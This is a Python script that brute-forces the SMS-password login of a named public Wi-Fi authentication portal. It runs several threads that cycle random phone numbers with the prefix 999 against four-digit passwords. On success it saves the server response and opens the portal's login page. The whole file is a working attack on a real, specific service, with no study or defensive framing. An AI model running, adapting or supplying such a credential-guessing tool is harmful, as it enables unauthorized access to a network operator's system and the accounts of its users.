# average bruteforce time - 1.6 mins

from itertools import product
import random
import requests
import webbrowser
import time
import threading
import sys

print('loading, please wait...')

url = "http://wifismsauth.tatar.ru/"
p = list(product('0123456789', repeat=4))
ph = list(product('0123456789', repeat=7))
e = []
bp = False

random.shuffle(ph)

t = int(input('threads (1-5): '))
while t not in range(1, 6):
    t = int(input('number of threads got to be a value in range from 1 to 5, try again: '))


def tuple_to_str(tup):
    result = ''
    for k in tup:
        result += str(k)
    return result


def brute(start, end, n):
    global bp
    for j in ph:
        e[n] = 0
        random.shuffle(p)
        for i in p[start:end]:
            data = {'phone': '999' + tuple_to_str(j), 'password': tuple_to_str(i)}
            s = requests.session()
            s.get(url)
            a = s.post(url, data=data)
            if a.text.find('неверный пароль') != -1:
                line = '('+str(n)+') [' + str(round(time.time() - time0, 1)) + '][FAILURE][' + str(a.status_code) + '] -- 999' + tuple_to_str(j) + ':' + tuple_to_str(i)
                print(line)
            else:
                line = '('+str(n)+') [' + str(round(time.time() - time0, 1)) + '][SUCCESS][' + str(a.status_code) + '] -- 999' + tuple_to_str(j) + ':' + tuple_to_str(i)
                print(line)
                print('you are connected now')
                webbrowser.open('http://wifiauth.tatar.ru/login.html')
                bp = True
                with open('RESPONSE', 'w') as out:
                    out.write(a.text)
                    out.close()
                sys.exit()
            if bp:
                sys.exit()
        e[n] = 1
        time.sleep(0.01)
        while e.count(1) != t:
            pass


threads = []
for l in range(t):
    e.append(0)
    threads.append(threading.Thread(target=brute, args=(round(26/t)*l, round(26/t)*(l+1), l)))

time0 = time.time()

for l in threads:
    l.start()
